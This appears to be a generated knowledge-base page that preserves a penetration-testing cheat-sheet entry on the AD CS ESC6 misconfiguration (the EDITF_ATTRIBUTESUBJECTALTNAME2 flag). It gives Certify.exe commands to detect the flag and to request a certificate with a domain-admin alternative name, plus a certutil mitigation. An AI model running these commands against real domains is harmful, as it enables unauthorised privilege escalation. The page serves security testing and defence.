---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Certificate ESC6

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adcs-esc06` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc06.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Certificate ESC6](../../topics/active-directory/active-directory-certificate-esc6.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adcs-esc06 |
| name | Active Directory - Certificate ESC6 |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adcs-esc06.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Certificate ESC6\n\n## ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2\n\n> If this flag is set on the\
  \ CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject\
  \ alternative name.\n\n**Exploitation**\n\n* Use [Certify.exe](https://github.com/GhostPack/Certify) to check for **UserSpecifiedSAN**\
  \ flag state which refers to the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.\n\n    ```ps1\n    Certify.exe cas\n    ```\n\n\
  * Request a certificate for a template and add an altname, even though the default `User` template doesn't normally allow\
  \ to specify alternative names\n\n    ```ps1\n    .\\Certify.exe request /ca:dc.domain.local\\domain-DC-CA /template:User\
  \ /altname:DomAdmin\n    ```\n\n**Mitigation**\n\n* Remove the flag: `certutil.exe -config \"CA01.domain.local\\CA01\" -setreg\
  \ \"policy\\EditFlags\" -EDITF_ATTRIBUTESUBJECTALTNAME2`\n\n## References\n\n* [AD CS: from ManageCA to RCE - February 11,\
  \ 2022 - Pablo Martínez, Kurosh Dabbagh](https://web.archive.org/web/20220212053945/http://www.blackarrow.net/ad-cs-from-manageca-to-rce//)"
_relative_path: active-directory/ad-adcs-esc06.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc06.md
````
